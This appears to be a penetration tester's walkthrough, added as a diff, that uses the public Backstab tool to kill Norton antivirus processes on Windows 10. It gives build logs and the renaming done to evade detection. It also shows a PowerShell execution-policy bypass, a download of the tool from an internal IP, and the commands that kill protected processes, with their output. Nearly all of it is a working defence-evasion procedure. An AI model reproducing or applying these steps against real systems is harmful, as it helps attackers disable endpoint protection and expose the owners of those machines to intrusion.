@@ -1,0 +1,226 @@
+================================================================================================================================
+Killing Antivirus/EDR protected processes using the tool 'Backstab'
+================================================================================================================================
+
+Source: https://github.com/Yaxser/Backstab
+
+=> Backstab is a tool capable of killing antimalware (AV and EDR) protected processes by leveraging sysinternals’ Process Explorer (ProcExp) driver, 
+   which is signed by Microsoft.
+=> ProcExp has a signed kernel driver that it loads on startup, which allows it to kill handles that cannot be killed even as an administrator. 
+   When you use the UI, you cannot kill a protected process, but you can kill it handles because ProcExp UI instructs the kernel driver to kill those handles.
+   Backstab does the same thing but without the UI element.
+
+OpSec considerations
+---------------------
+1. Embedded driver is dropped to disk
+2. Registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services is created
+3. The privilege SE_PRIVILEGE_ENABLED is acquired because it is necessary to load the driver
+4. Driver is loaded using NtLoadDriver to avoid creating a service
+5. The created Registry key is deleted (service not visible during execution)
+6. Communication with the driver is via using DeviceIoControl
+7. For handle enumeration, NtQuerySystemInformation is called
+
+
+==========================================================================================================================================
+PoC - Killing the Norton AV processes running on a Windows 10 laptop fully patched using the tool 'Backstab'
+==========================================================================================================================================
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+Step 1 - Download the source code from GitHub and then make a few modification to obfuscate it a little and compile it
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+Very basic obfuscation
+------------------------
+> Rename the word 'Blackout' by 'KillAV' in the source code files and in the file names
+> Remove/modify/add comments in the source code
+> ...
+
+Logs of Visual Studio
+----------------------
+Build started...
+1>------ Build started: Project: KillAV, Configuration: Release x64 ------
+1>common.c
+1>Driverloading.c
+1>getopt.c
+1>main.c
+1>C:\Users\pentester\Documents\Tools-Pentest\1-Antivirus-bypass\Backstab\KillAV\main.c(243,39): warning C4020: 'Info': too many actual parameters
+1>C:\Users\pentester\Documents\Tools-Pentest\1-Antivirus-bypass\Backstab\KillAV\main.c(316,41): warning C4020: 'Info': too many actual parameters
+1>ppl.c
+1>Process.c
+1>ProcExp.c
+1>resource.c
+1>Generating code
+1>Previous IPDB not found, fall back to full compilation.
+1>All 47 functions were compiled because no usable IPDB/IOBJ from previous compilation was found.
+1>Finished generating code
+1>KillAV.vcxproj -> C:\Users\pentester\Documents\Tools-Pentest\1-Antivirus-bypass\Backstab\x64\Release\KillAV.exe
+1>Done building project "KillAV.vcxproj".
+========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========
+========== Build started at 2:00 AM and took 02.310 seconds ==========
+
+
+
+C:\Users\pentester\Documents\Tools-Pentest\1-Antivirus-bypass\Backstab\x64\Release> dir
+ Volume in drive C is Windows
+ Volume Serial Number is F06E-DC58
+
+ Directory of C:\Users\pentester\Documents\Tools-Pentest\1-Antivirus-bypass\Backstab\x64\Release
+
+09/04/2023  02:00 AM    <DIR>          .
+09/04/2023  02:00 AM    <DIR>          ..
+09/04/2023  02:00 AM            63,488 KillAV.exe
+09/04/2023  02:00 AM           561,152 KillAV.pdb
+               2 File(s)        624,640 bytes
+               2 Dir(s)  72,595,120,128 bytes free
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Download the "obfuscated" version of the tool 'Backstab.exe' (renamed as KillAV.exe) on a Windows 10 Laptop protected by the Norton AV product
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+
+C:\Temp> powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Temp> Invoke-WebRequest -URI http://192.168.1.144:8080/Release/KillAV.exe -Outfile KillAV.exe
+
+PS C:\Temp> ls .\KillAV.exe                                                                                                                                                 
+
+    Directory: C:\Temp
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         9/4/2023  12:21 AM          63488 KillAV.exe
+
+
+Important notes regarding the AV solution running on the target Windows 10 laptop during my tests
+--------------------------------------------------------------------------------------------------
+
+> The Norton 360 Security solution (Antivirus) is running, up-to-date and with the real-time protection enabled (however 'heuristic detection' is Off).
+  Windows Defender is running but is not "active".
+
+PS C:\Temp> Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct                                                                                     
+
+displayName              : Windows Defender
+instanceGuid             : {D68DDC3A-831F-4fae-9E44-DA132C1ACF46}
+pathToSignedProductExe   : windowsdefender://
+pathToSignedReportingExe : %ProgramFiles%\Windows Defender\MsMpeng.exe
+productState             : 393472
+timestamp                : Mon, 04 Sep 2023 04:43:40 GMT
+PSComputerName           :
+
+displayName              : Norton 360
+instanceGuid             : {AECE2126-F4E7-6909-11F2-1B69D1FBCBD0}
+pathToSignedProductExe   : C:\Program Files\Norton Security\Engine\22.22.11.12\WSCStub.exe
+pathToSignedReportingExe : C:\Program Files\Norton Security\Engine\22.22.11.12\nsWscSvc.exe
+productState             : 331776
+timestamp                : Mon, 04 Sep 2023 07:15:29 GMT
+PSComputerName
+
+
+> The Norton 360 Security solution (AV) has several processes:
+  + 2 are named 'NortonSecurity' with the PID '7592' and '3136'
+  + 1 is named 'nsWscSvc' (Norton Security WSC Service) with the PID '2612'
+
+PS C:\Temp> ps *NortonSecurity*                                                                                                                                             
+ NPM(K)    PM(M)      WS(M)     CPU(s)      Id  SI ProcessName
+ ------    -----      -----     ------      --  -- -----------
+     80   289.75      30.14     104.86    3136   0 NortonSecurity
+     64    47.61      10.99      39.89    7592   1 NortonSecurity
+
+PS C:\Temp> ps *NsWscSvc*
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+      4       9     3140       8308       0.52   2612   0 nsWscSvc
+
+
+-----------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Run the obfuscated version of the tool with local admin privileges and kill the processes of the Norton AV solution
+-----------------------------------------------------------------------------------------------------------------------------------
+
+C:\Temp> KillAV.exe
+
+[!] Either PID number or name is incorrect
+
+Usage: KillAV.exe <-n name || -p PID> [options]
+        -n,             Choose process by name, including the .exe suffix
+        -p,             Choose process by PID
+        -l,             List handles of protected process
+        -k,             Kill the protected process by closing its handles
+        -x,             Close a specific handle
+        -d,             Specify path to where ProcExp will be extracted
+        -s,             Specify service name registry key
+        -u,             (attempt to) Unload ProcExp driver
+        -h,             Print this menu
+Examples:
+        KillAV.exe -n cyserver.exe -k            [kill cyserver]
+        KillAV.exe -n cyserver.exe -x E4C                [Close handle E4C of cyserver]
+        KillAV.exe -n cyserver.exe -l           [list all handles of cyserver]
+        KillAV.exe -p 4326 -k -d c:\\driver.sys         [kill protected process with PID 4326, extract ProcExp driver to C:\]
+
+
+=> We use the command "-p PID-number -k -d c:\Temp\PROCEXP.sys' for the 3 Norton processes (PID = 7592, 3136 and 2612)
+
+C:\Temp> KillAV.exe -p 2612 -k -d c:\Temp\PROCEXP.sys
+[*] extracting the drive to %ws
+Driver loaded as ProcExp64
+[+] Connected to Driver successfully
+[*] Process PID: 2612
+[*] Process Protection level: 3 - PsProtectedSignerAntimalware-Light
+[*] Killing process
+[!] ProcExpKillHandle.DeviceIoControl: 6
+[!] ProcExpKillHandle.DeviceIoControl: 6
+[!] ProcExpKillHandle.DeviceIoControl: 6
+[!] ProcExpKillHandle.DeviceIoControl: 6
+[!] ProcExpKillHandle.DeviceIoControl: 6
+[!] ProcExpKillHandle.DeviceIoControl: 6
+[+] Killing process succeeded
+[+] Driver File cleaned up from disk
+
+
+C:\Temp> KillAV.exe -p 7592 -k -d c:\Temp\PROCEXP.sys
+[*] extracting the drive to %ws
+Driver loaded as ProcExp64
+[+] Connected to Driver successfully
+[*] Process PID: 7592
+[*] Process Protection level: -2 - None
+[*] Killing process
+[!] ProcExpKillHandle.DeviceIoControl: 6
+[!] ProcExpKillHandle.DeviceIoControl: 6
+[!] ProcExpKillHandle.DeviceIoControl: 6
+[!] ProcExpKillHandle.DeviceIoControl: 6
+[!] ProcExpKillHandle.DeviceIoControl: 6
+[!] ProcExpKillHandle.DeviceIoControl: 6
+[!] ProcExpKillHandle.DeviceIoControl: 6
+[!] ProcExpKillHandle.DeviceIoControl: 6
+[+] Killing process succeeded
+[+] Driver File cleaned up from disk
+
+
+C:\Temp> KillAV.exe -p 3136 -k -d c:\Temp\PROCEXP.sys
+[*] extracting the drive to %ws
+Driver loaded as ProcExp64
+[+] Connected to Driver successfully
+[*] Process PID: 3136
+[*] Process Protection level: -2 - None
+[*] Killing process
+[+] Killing process succeeded
+[+] Driver File cleaned up from disk
+
+
+=> Mixed results :-(
+-----------------
+> The Norton AV GUI has shutdown but only the Norton AV process named 'NortonSecurity' with the PID '7592' has been killed. 
+> Even if the Norton AV is not working properly anymore, 2 Norton AV processes are still running so the tool did not worked properly.
+
+C:\Temp>powershell -c ps *Norton*
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+     53      66   291996      35032   2,173.91   3136   0 NortonSecurity
+
+C:\Temp>powershell -c ps *NsWscSvc*
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+      4       9     3140       8308       0.52   2612   0 nsWscSvc
